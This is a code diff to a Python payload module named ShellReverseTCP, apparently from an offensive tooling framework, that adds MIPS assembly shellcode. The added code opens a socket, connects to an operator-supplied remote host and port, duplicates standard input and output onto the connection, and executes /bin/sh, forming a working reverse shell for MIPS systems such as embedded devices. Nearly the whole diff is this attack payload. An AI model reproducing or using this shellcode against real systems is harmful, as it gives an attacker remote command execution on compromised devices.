@@ -45,7 +45,59 @@ class ShellReverseTCP(HatAsm, HatVenom, Words):
         rport = self.convert_port(options['RPORT'])
 
         shellcode = f"""
-        
+        start:
+            li $t7, -6
+            nor $t7, $t7, $zero
+            addi $a0, $t7, -3
+            addi $a1, $t7, -3
+            slti $a2, $zero, -1
+            li $v0, 4183
+            syscall 0x40404
+
+            sw $v0, -1($sp)
+            lw $a0, -1($sp)
+            li $t7, 0xfffd
+            nor $t7, $t7, $zero
+            sw $t7, -32($sp)
+            lui $t6, 0x{rport.hex()}
+            ori $t6, $t6, 0x{rport.hex()}
+            sw $t6, -28($sp)
+            lui $t6, 0x{rhost[:2].hex()}
+            ori $t6, $t6, 0x{rhost[2:].hex()}
+            sw $t6, -26($sp)
+            addiu $a1, $sp, -30
+            li $t4, -17
+            nor $a2, $t4, $zero
+            li $v0, 4170
+            syscall 0x40404
+            
+            li $s1, -3
+            nor $s1, $s1, $zero
+            lw $a0, -1($sp)
+            move $a1, $s1
+
+        dup:
+            li $v0, 4063
+            syscall 0x40404
+
+            li $s0, -1
+            addi $s1, $s1, -1
+            bne $s1, $s0, dup
+
+            slti $a2, $zero, -1
+            lui $t7, 0x2f2f
+            ori $t7, $t7, 0x6269
+            sw $t7, -20($sp)
+            lui $t6, 0x6e2f
+            ori $t6, $t6, 0x7368
+            sw $t6, -16($sp)
+            sw $zero, -12($sp)
+            addiu $a0, $sp, -20
+            sw $a0, -8($sp)
+            sw $zero, -4($sp)
+            addiu $a1, $sp, -8
+            li $v0, 4011
+            syscall 0x40404
         """
 
         if assemble:
